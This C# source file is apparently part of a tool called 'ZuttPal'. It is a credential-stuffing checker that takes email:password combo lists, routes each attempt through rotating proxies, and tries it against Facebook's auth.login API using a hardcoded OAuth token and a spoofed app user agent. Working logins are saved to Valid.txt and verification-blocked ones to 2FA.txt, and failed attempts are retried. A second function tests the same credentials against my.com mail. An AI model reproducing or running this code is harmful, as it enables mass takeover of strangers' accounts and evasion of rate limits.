using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using AuthGG;
using Leaf.xNet;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class check19
	{
		public static string Path4;
		public static string Path3;
		public static string Path2;
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();



		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Checking22.Combo.IsEmpty)
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						if (Checking22.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.Proxy = Checking22.RandomProxies();
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.SslProtocols = System.Security.Authentication.SslProtocols.Tls12;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.AllowAutoRedirect = true;
								httpRequest.AddHeader("User-Agent", "Dalvik/2.1.0 (Linux; U; Android 9; Redmi 7 MIUI/V11.0.6.0.PFLMIXM) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]");
								httpRequest.AddHeader("Pragma", "no-cache");
								httpRequest.AddHeader("authority", "b-api.facebook.com");
								httpRequest.AddHeader("authorization", "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16");
								string yes = email + ":" + password;
								string postdata = $"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id=cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=auth.login";
								HttpResponse PostRequest = httpRequest.Post("https://b-api.facebook.com/method/auth.login", postdata, "application/x-www-form-urlencoded");
								var post = PostRequest.ToString();
								if (post.Contains("session_key"))
								{
									Interlocked.Increment(ref Checking22.CheckedLines);
									Interlocked.Increment(ref Checking22.currentCpm);
									Interlocked.Increment(ref Checking22.Hits);
									if (Program.config.printgood == "True")
									{

										Console.WriteLine("[»] Valid - " + account, Color.Green);
									}
									Save(Path + "\\Valid.txt", account);
									break;
								}
								else if (post.Contains("Invalid username or password"))
								{
									Interlocked.Increment(ref Checking22.CheckedLines);
									Interlocked.Increment(ref Checking22.currentCpm);
									Interlocked.Increment(ref Checking22.Bad);
									if (Program.config.printbad == "True")
									{
										Console.WriteLine("[»] Invalid - " + account, Color.Red);
									}
									break;
								}
								else if (post.Contains("User must verify"))
                                {
									Interlocked.Increment(ref Checking22.CheckedLines);
									Interlocked.Increment(ref Checking22.currentCpm);
									Interlocked.Increment(ref Checking22.twofa);
									if (Program.config.print2fa == "True")
									{
										Console.WriteLine("[»] 2FA - " + account, Color.Purple);
									}
									Save(Path + "\\2FA.txt", account);
									break;
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Checking22.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Checking22.retry);
							}
						}
					}
				}
			}
		}
		private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.Proxy = Checking22.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					Interlocked.Increment(ref Checking22.Errors);
				}
			}
			return "";
		}
		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}

		public static string uri = "";

		public static string auther = "";

		public static string printbad = "";

		public static string printlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
